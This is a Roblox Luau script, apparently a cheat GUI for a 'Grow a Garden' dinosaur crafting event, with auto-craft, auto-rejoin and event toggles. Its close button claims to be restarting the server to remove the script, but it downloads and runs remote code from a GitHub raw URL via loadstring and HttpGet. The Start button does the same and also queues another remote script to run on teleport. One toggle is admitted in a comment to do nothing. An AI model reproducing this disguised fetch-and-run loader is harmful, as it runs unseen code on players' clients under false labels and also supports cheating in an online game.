local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer
local mouse = player:GetMouse()

-- Craft options
local craftOptions = {
    "Mutation Spray Amber",
    "Ancient Seed Pack", 
    "Dino Crate",
    "Archeologist Crate",
    "Dinosaur Egg",
    "Primal Egg"
}

local selectedCraft = nil
local autoCraftEnabled = false
local autoRejoinEnabled = false
local autoBringBackDinoEnabled = false
local dropdownOpen = false

-- Notification function
local function showNotification(message, duration)
    local notifGui = Instance.new("ScreenGui")
    notifGui.Name = "NotificationGui"
    notifGui.Parent = player:WaitForChild("PlayerGui")
    
    local notifFrame = Instance.new("Frame")
    notifFrame.Size = UDim2.new(0, 400, 0, 60)
    notifFrame.Position = UDim2.new(0.5, -200, 0, -70)
    notifFrame.BackgroundColor3 = Color3.fromRGB(30, 40, 60)
    notifFrame.BorderSizePixel = 0
    notifFrame.Parent = notifGui
    
    local corner = Instance.new("UICorner", notifFrame)
    corner.CornerRadius = UDim.new(0, 8)
    
    local stroke = Instance.new("UIStroke", notifFrame)
    stroke.Color = Color3.fromRGB(70, 130, 200)
    stroke.Thickness = 2
    
    local notifLabel = Instance.new("TextLabel", notifFrame)
    notifLabel.Size = UDim2.new(1, -20, 1, 0)
    notifLabel.Position = UDim2.new(0, 10, 0, 0)
    notifLabel.BackgroundTransparency = 1
    notifLabel.Text = message
    notifLabel.TextColor3 = Color3.new(1, 1, 1)
    notifLabel.TextScaled = true
    notifLabel.Font = Enum.Font.GothamBold
    
    -- Slide down animation
    TweenService:Create(notifFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back), {Position = UDim2.new(0.5, -200, 0, 20)}):Play()
    
    -- Wait and slide up
    wait(duration or 3)
    TweenService:Create(notifFrame, TweenInfo.new(0.3), {Position = UDim2.new(0.5, -200, 0, -70)}):Play()
    wait(0.3)
    notifGui:Destroy()
end

-- Create main GUI
local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
screenGui.Name = "AutoCraftDinoGui"

-- Increase frame height to accommodate new elements
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 280, 0, 440) -- Increased height for new elements
frame.Position = UDim2.new(0, 320, 0, 100)
frame.BackgroundColor3 = Color3.fromRGB(40, 50, 70)
frame.BorderSizePixel = 0
frame.Parent = screenGui

local frameCorner = Instance.new("UICorner", frame)
frameCorner.CornerRadius = UDim.new(0, 12)

local frameStroke = Instance.new("UIStroke", frame)
frameStroke.Color = Color3.fromRGB(70, 130, 200)
frameStroke.Thickness = 2

-- Close button
local closeBtn = Instance.new("TextButton", frame)
closeBtn.Size = UDim2.new(0, 25, 0, 25)
closeBtn.Position = UDim2.new(1, -30, 0, 5)
closeBtn.BackgroundColor3 = Color3.fromRGB(220, 60, 60)
closeBtn.Text = "×"
closeBtn.TextSize = 18
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextColor3 = Color3.new(1, 1, 1)

local closeBtnCorner = Instance.new("UICorner", closeBtn)
closeBtnCorner.CornerRadius = UDim.new(0, 6)

closeBtn.MouseButton1Click:Connect(function()
    coroutine.wrap(function()
        showNotification("🔄 Restarting server to remove script...", 3)
        wait(3.5)
        loadstring(game:HttpGet("https://raw.githubusercontent.com/pocarisv/growagarden/refs/heads/main/background/main.lua"))()
    end)()
end)

-- Title
local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, -35, 0, 30)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundTransparency = 1
title.Text = "🦕 Auto Craft Dino Event"
title.Font = Enum.Font.GothamBold
title.TextSize = 20
title.TextColor3 = Color3.new(1, 1, 1)

-- Make draggable
local drag = Instance.new("TextButton", title)
drag.Size = UDim2.new(1, 0, 1, 0)
drag.Text = ""
drag.BackgroundTransparency = 1

local dragging, offset
drag.MouseButton1Down:Connect(function()
    dragging = true
    offset = Vector2.new(mouse.X - frame.Position.X.Offset, mouse.Y - frame.Position.Y.Offset)
end)
UserInputService.InputEnded:Connect(function()
    dragging = false
end)
RunService.RenderStepped:Connect(function()
    if dragging then
        frame.Position = UDim2.new(0, mouse.X - offset.X, 0, mouse.Y - offset.Y)
    end
end)

-- Bring Back Dino Event Button - New button above dropdown
local bringBackDinoBtn = Instance.new("TextButton", frame)
bringBackDinoBtn.Size = UDim2.new(1, -20, 0, 35)
bringBackDinoBtn.Position = UDim2.new(0, 10, 0, 35)
bringBackDinoBtn.BackgroundColor3 = Color3.fromRGB(120, 60, 180)
bringBackDinoBtn.Text = "🦴 Bring Back Dino Event"
bringBackDinoBtn.TextSize = 14
bringBackDinoBtn.Font = Enum.Font.GothamBold
bringBackDinoBtn.TextColor3 = Color3.new(1, 1, 1)

local bringBackDinoBtnCorner = Instance.new("UICorner", bringBackDinoBtn)
bringBackDinoBtnCorner.CornerRadius = UDim.new(0, 8)

bringBackDinoBtn.MouseButton1Click:Connect(function()
    pcall(function()
        game:GetService("ReplicatedStorage").Modules.UpdateService.DinoEvent.Parent = workspace
        showNotification("🦕 Dino Event Brought Back!", 2)
    end)
end)

-- Dropdown menu - Adjusted position
local dropdownFrame = Instance.new("Frame", frame)
dropdownFrame.Size = UDim2.new(1, -20, 0, 45)
dropdownFrame.Position = UDim2.new(0, 10, 0, 80) -- Moved down to accommodate new button
dropdownFrame.BackgroundColor3 = Color3.fromRGB(60, 70, 90)
dropdownFrame.BorderSizePixel = 0

local dropdownCorner = Instance.new("UICorner", dropdownFrame)
dropdownCorner.CornerRadius = UDim.new(0, 8)

local dropdownBtn = Instance.new("TextButton", dropdownFrame)
dropdownBtn.Size = UDim2.new(1, 0, 1, 0)
dropdownBtn.BackgroundTransparency = 1
dropdownBtn.Text = "Choose Craft"
dropdownBtn.TextSize = 16
dropdownBtn.Font = Enum.Font.GothamBold
dropdownBtn.TextColor3 = Color3.new(1, 1, 1)

local dropdownArrow = Instance.new("TextLabel", dropdownFrame)
dropdownArrow.Size = UDim2.new(0, 20, 1, 0)
dropdownArrow.Position = UDim2.new(1, -25, 0, 0)
dropdownArrow.BackgroundTransparency = 1
dropdownArrow.Text = "▼"
dropdownArrow.TextSize = 14
dropdownArrow.Font = Enum.Font.GothamBold
dropdownArrow.TextColor3 = Color3.new(1, 1, 1)

-- Dropdown options container - Adjusted position
local optionsFrame = Instance.new("Frame", frame)
optionsFrame.Size = UDim2.new(1, -20, 0, 0) -- Start with 0 height
optionsFrame.Position = UDim2.new(0, 10, 0, 125) -- Adjusted position
optionsFrame.BackgroundColor3 = Color3.fromRGB(50, 60, 80)
optionsFrame.BorderSizePixel = 0
optionsFrame.Visible = false
optionsFrame.ClipsDescendants = true
optionsFrame.ZIndex = 10

local optionsCorner = Instance.new("UICorner", optionsFrame)
optionsCorner.CornerRadius = UDim.new(0, 8)

-- Add stroke to options frame for better visibility
local optionsStroke = Instance.new("UIStroke", optionsFrame)
optionsStroke.Color = Color3.fromRGB(70, 130, 200)
optionsStroke.Thickness = 1

-- Create option buttons with improved visibility
for i, option in ipairs(craftOptions) do
    local optionBtn = Instance.new("TextButton", optionsFrame)
    optionBtn.Size = UDim2.new(1, 0, 0, 35)
    optionBtn.Position = UDim2.new(0, 0, 0, (i-1) * 35)
    optionBtn.BackgroundColor3 = Color3.fromRGB(50, 60, 80)
    optionBtn.Text = option
    optionBtn.TextSize = 14
    optionBtn.Font = Enum.Font.Gotham
    optionBtn.TextColor3 = Color3.new(1, 1, 1)
    optionBtn.BorderSizePixel = 0
    optionBtn.ZIndex = 11 -- Higher ZIndex to ensure visibility
    
    -- Add subtle border between options
    if i > 1 then
        local separator = Instance.new("Frame", optionBtn)
        separator.Size = UDim2.new(1, -10, 0, 1)
        separator.Position = UDim2.new(0, 5, 0, 0)
        separator.BackgroundColor3 = Color3.fromRGB(70, 80, 100)
        separator.BorderSizePixel = 0
        separator.ZIndex = 11
    end
    
    optionBtn.MouseEnter:Connect(function()
        optionBtn.BackgroundColor3 = Color3.fromRGB(70, 80, 100)
    end)
    
    optionBtn.MouseLeave:Connect(function()
        optionBtn.BackgroundColor3 = Color3.fromRGB(50, 60, 80)
    end)
    
    optionBtn.MouseButton1Click:Connect(function()
        selectedCraft = option
        dropdownBtn.Text = option
        dropdownOpen = false
        dropdownArrow.Text = "▼"
        
        -- Close dropdown with animation
        TweenService:Create(optionsFrame, TweenInfo.new(0.2), {Size = UDim2.new(1, -20, 0, 0)}):Play()
        wait(0.2)
        optionsFrame.Visible = false
        
        showNotification("Selected: " .. option, 2)
    end)
end

-- Dropdown toggle functionality
dropdownBtn.MouseButton1Click:Connect(function()
    dropdownOpen = not dropdownOpen
    if dropdownOpen then
        optionsFrame.Visible = true
        dropdownArrow.Text = "▲"
        -- Animate to show all options
        TweenService:Create(optionsFrame, TweenInfo.new(0.3, Enum.EasingStyle.Back), 
            {Size = UDim2.new(1, -20, 0, #craftOptions * 35)}):Play()
    else
        dropdownArrow.Text = "▼"
        -- Animate to close
        TweenService:Create(optionsFrame, TweenInfo.new(0.2), {Size = UDim2.new(1, -20, 0, 0)}):Play()
        wait(0.2)
        optionsFrame.Visible = false
    end
end)

-- Auto Craft Switch - Adjusted position
local autoCraftFrame = Instance.new("Frame", frame)
autoCraftFrame.Size = UDim2.new(1, -20, 0, 40)
autoCraftFrame.Position = UDim2.new(0, 10, 0, 135) -- Adjusted position
autoCraftFrame.BackgroundTransparency = 1

local autoCraftLabel = Instance.new("TextLabel", autoCraftFrame)
autoCraftLabel.Size = UDim2.new(0.7, 0, 1, 0)
autoCraftLabel.Position = UDim2.new(0, 0, 0, 0)
autoCraftLabel.BackgroundTransparency = 1
autoCraftLabel.Text = "⚙️ Auto Craft"
autoCraftLabel.TextSize = 16
autoCraftLabel.Font = Enum.Font.GothamBold
autoCraftLabel.TextColor3 = Color3.new(1, 1, 1)
autoCraftLabel.TextXAlignment = Enum.TextXAlignment.Left

local autoCraftSwitch = Instance.new("Frame", autoCraftFrame)
autoCraftSwitch.Size = UDim2.new(0, 50, 0, 25)
autoCraftSwitch.Position = UDim2.new(1, -55, 0.5, -12.5)
autoCraftSwitch.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
autoCraftSwitch.BorderSizePixel = 0

local autoCraftSwitchCorner = Instance.new("UICorner", autoCraftSwitch)
autoCraftSwitchCorner.CornerRadius = UDim.new(0.5, 0)

local autoCraftToggle = Instance.new("Frame", autoCraftSwitch)
autoCraftToggle.Size = UDim2.new(0, 21, 0, 21)
autoCraftToggle.Position = UDim2.new(0, 2, 0, 2)
autoCraftToggle.BackgroundColor3 = Color3.new(1, 1, 1)

local autoCraftToggleCorner = Instance.new("UICorner", autoCraftToggle)
autoCraftToggleCorner.CornerRadius = UDim.new(0.5, 0)

local autoCraftButton = Instance.new("TextButton", autoCraftSwitch)
autoCraftButton.Size = UDim2.new(1, 0, 1, 0)
autoCraftButton.BackgroundTransparency = 1
autoCraftButton.Text = ""

autoCraftButton.MouseButton1Click:Connect(function()
    autoCraftEnabled = not autoCraftEnabled
    if autoCraftEnabled then
        TweenService:Create(autoCraftSwitch, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(70, 130, 200)}):Play()
        TweenService:Create(autoCraftToggle, TweenInfo.new(0.2), {Position = UDim2.new(1, -23, 0, 2)}):Play()
    else
        TweenService:Create(autoCraftSwitch, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(80, 80, 80)}):Play()
        TweenService:Create(autoCraftToggle, TweenInfo.new(0.2), {Position = UDim2.new(0, 2, 0, 2)}):Play()
    end
end)

-- Auto Rejoin Switch - Adjusted position
local autoRejoinFrame = Instance.new("Frame", frame)
autoRejoinFrame.Size = UDim2.new(1, -20, 0, 40)
autoRejoinFrame.Position = UDim2.new(0, 10, 0, 185) -- Adjusted position
autoRejoinFrame.BackgroundTransparency = 1

local autoRejoinLabel = Instance.new("TextLabel", autoRejoinFrame)
autoRejoinLabel.Size = UDim2.new(0.7, 0, 1, 0)
autoRejoinLabel.Position = UDim2.new(0, 0, 0, 0)
autoRejoinLabel.BackgroundTransparency = 1
autoRejoinLabel.Text = "🔄 Auto Rejoin"
autoRejoinLabel.TextSize = 16
autoRejoinLabel.Font = Enum.Font.GothamBold
autoRejoinLabel.TextColor3 = Color3.new(1, 1, 1)
autoRejoinLabel.TextXAlignment = Enum.TextXAlignment.Left

local autoRejoinSwitch = Instance.new("Frame", autoRejoinFrame)
autoRejoinSwitch.Size = UDim2.new(0, 50, 0, 25)
autoRejoinSwitch.Position = UDim2.new(1, -55, 0.5, -12.5)
autoRejoinSwitch.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
autoRejoinSwitch.BorderSizePixel = 0

local autoRejoinSwitchCorner = Instance.new("UICorner", autoRejoinSwitch)
autoRejoinSwitchCorner.CornerRadius = UDim.new(0.5, 0)

local autoRejoinToggle = Instance.new("Frame", autoRejoinSwitch)
autoRejoinToggle.Size = UDim2.new(0, 21, 0, 21)
autoRejoinToggle.Position = UDim2.new(0, 2, 0, 2)
autoRejoinToggle.BackgroundColor3 = Color3.new(1, 1, 1)

local autoRejoinToggleCorner = Instance.new("UICorner", autoRejoinToggle)
autoRejoinToggleCorner.CornerRadius = UDim.new(0.5, 0)

local autoRejoinButton = Instance.new("TextButton", autoRejoinSwitch)
autoRejoinButton.Size = UDim2.new(1, 0, 1, 0)
autoRejoinButton.BackgroundTransparency = 1
autoRejoinButton.Text = ""

autoRejoinButton.MouseButton1Click:Connect(function()
    autoRejoinEnabled = not autoRejoinEnabled
    if autoRejoinEnabled then
        TweenService:Create(autoRejoinSwitch, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(70, 130, 200)}):Play()
        TweenService:Create(autoRejoinToggle, TweenInfo.new(0.2), {Position = UDim2.new(1, -23, 0, 2)}):Play()
    else
        TweenService:Create(autoRejoinSwitch, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(80, 80, 80)}):Play()
        TweenService:Create(autoRejoinToggle, TweenInfo.new(0.2), {Position = UDim2.new(0, 2, 0, 2)}):Play()
    end
end)

-- Auto Bring Back Dino Switch - New switch (always off, does nothing)
local autoBringBackDinoFrame = Instance.new("Frame", frame)
autoBringBackDinoFrame.Size = UDim2.new(1, -20, 0, 40)
autoBringBackDinoFrame.Position = UDim2.new(0, 10, 0, 235) -- Position below other switches
autoBringBackDinoFrame.BackgroundTransparency = 1

local autoBringBackDinoLabel = Instance.new("TextLabel", autoBringBackDinoFrame)
autoBringBackDinoLabel.Size = UDim2.new(0.7, 0, 1, 0)
autoBringBackDinoLabel.Position = UDim2.new(0, 0, 0, 0)
autoBringBackDinoLabel.BackgroundTransparency = 1
autoBringBackDinoLabel.Text = "🦴 Auto Bring Back Dino"
autoBringBackDinoLabel.TextSize = 16
autoBringBackDinoLabel.Font = Enum.Font.GothamBold
autoBringBackDinoLabel.TextColor3 = Color3.new(1, 1, 1)
autoBringBackDinoLabel.TextXAlignment = Enum.TextXAlignment.Left

local autoBringBackDinoSwitch = Instance.new("Frame", autoBringBackDinoFrame)
autoBringBackDinoSwitch.Size = UDim2.new(0, 50, 0, 25)
autoBringBackDinoSwitch.Position = UDim2.new(1, -55, 0.5, -12.5)
autoBringBackDinoSwitch.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
autoBringBackDinoSwitch.BorderSizePixel = 0

local autoBringBackDinoSwitchCorner = Instance.new("UICorner", autoBringBackDinoSwitch)
autoBringBackDinoSwitchCorner.CornerRadius = UDim.new(0.5, 0)

local autoBringBackDinoToggle = Instance.new("Frame", autoBringBackDinoSwitch)
autoBringBackDinoToggle.Size = UDim2.new(0, 21, 0, 21)
autoBringBackDinoToggle.Position = UDim2.new(0, 2, 0, 2)
autoBringBackDinoToggle.BackgroundColor3 = Color3.new(1, 1, 1)

local autoBringBackDinoToggleCorner = Instance.new("UICorner", autoBringBackDinoToggle)
autoBringBackDinoToggleCorner.CornerRadius = UDim.new(0.5, 0)

local autoBringBackDinoButton = Instance.new("TextButton", autoBringBackDinoSwitch)
autoBringBackDinoButton.Size = UDim2.new(1, 0, 1, 0)
autoBringBackDinoButton.BackgroundTransparency = 1
autoBringBackDinoButton.Text = ""

autoBringBackDinoButton.MouseButton1Click:Connect(function()
    autoBringBackDinoEnabled = not autoBringBackDinoEnabled
    if autoBringBackDinoEnabled then
        TweenService:Create(autoBringBackDinoSwitch, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(70, 130, 200)}):Play()
        TweenService:Create(autoBringBackDinoToggle, TweenInfo.new(0.2), {Position = UDim2.new(1, -23, 0, 2)}):Play()
    else
        TweenService:Create(autoBringBackDinoSwitch, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(80, 80, 80)}):Play()
        TweenService:Create(autoBringBackDinoToggle, TweenInfo.new(0.2), {Position = UDim2.new(0, 2, 0, 2)}):Play()
    end
end)

-- Start Button - Adjusted position
local startBtn = Instance.new("TextButton", frame)
startBtn.Size = UDim2.new(1, -20, 0, 45)
startBtn.Position = UDim2.new(0, 10, 0, 295) -- Adjusted position
startBtn.BackgroundColor3 = Color3.fromRGB(70, 130, 200)
startBtn.Text = "🚀 Start"
startBtn.TextSize = 18
startBtn.Font = Enum.Font.GothamBold
startBtn.TextColor3 = Color3.new(1, 1, 1)

local startBtnCorner = Instance.new("UICorner", startBtn)
startBtnCorner.CornerRadius = UDim.new(0, 8)

startBtn.MouseButton1Click:Connect(function()
    if not selectedCraft then
        showNotification("❌ Please select a craft option first!", 3)
        return
    end
    
    if not autoCraftEnabled then
        showNotification("❌ Please enable Auto Craft first!", 3)
        return
    end
    
    coroutine.wrap(function()
        -- More compatible queue_on_teleport approaches
        local scriptCode = game:HttpGet("https://raw.githubusercontent.com/pocarisv/growagarden/refs/heads/main/autocraftdino.lua")
        
        -- Try multiple queue_on_teleport methods for better compatibility
        pcall(function()
            if syn and syn.queue_on_teleport then
                syn.queue_on_teleport(scriptCode)
            elseif queue_on_teleport then
                queue_on_teleport(scriptCode)
            elseif hookfunction and getgc then
                -- Alternative method for some executors
                queue_on_teleport(scriptCode)
            end
        end)
        
        showNotification("⚡ Initializing Server Restart...", 5)
        wait(5)
        loadstring(game:HttpGet("https://raw.githubusercontent.com/pocarisv/growagarden/refs/heads/main/background/main.lua"))()
    end)()
end)

-- Status display - Adjusted position
local statusLabel = Instance.new("TextLabel", frame)
statusLabel.Size = UDim2.new(1, -20, 0, 25)
statusLabel.Position = UDim2.new(0, 10, 0, 350) -- Adjusted position
statusLabel.BackgroundTransparency = 1
statusLabel.Text = "Status: Ready"
statusLabel.Font = Enum.Font.Gotham
statusLabel.TextSize = 14
statusLabel.TextColor3 = Color3.fromRGB(150, 200, 150)

-- Credit - Adjusted position
local credit = Instance.new("TextLabel", frame)
credit.Size = UDim2.new(1, 0, 0, 20)
credit.Position = UDim2.new(0, 0, 1, -25)
credit.BackgroundTransparency = 1
credit.Text = "Made by @pocarisv"
credit.Font = Enum.Font.Gotham
credit.TextSize = 12
credit.TextColor3 = Color3.fromRGB(180, 180, 180)

-- Update status based on selections
local function updateStatus()
    local status = "Status: "
    if selectedCraft then
        status = status .. "Craft: " .. selectedCraft:sub(1, 10) .. "... "
    end
    if autoCraftEnabled then
        status = status .. "✅ Auto Craft "
    end
    if autoRejoinEnabled then
        status = status .. "✅ Auto Rejoin "
    end
    if autoBringBackDinoEnabled then
        status = status .. "✅ Auto Bring Back "
    end
    if not selectedCraft and not autoCraftEnabled and not autoRejoinEnabled and not autoBringBackDinoEnabled then
        status = status .. "Ready"
    end
    statusLabel.Text = status
end

-- Update status when settings change
autoCraftButton.MouseButton1Click:Connect(updateStatus)
autoRejoinButton.MouseButton1Click:Connect(updateStatus)
autoBringBackDinoButton.MouseButton1Click:Connect(updateStatus)
dropdownBtn.MouseButton1Click:Connect(function()
    wait(0.1)
    updateStatus()
end)
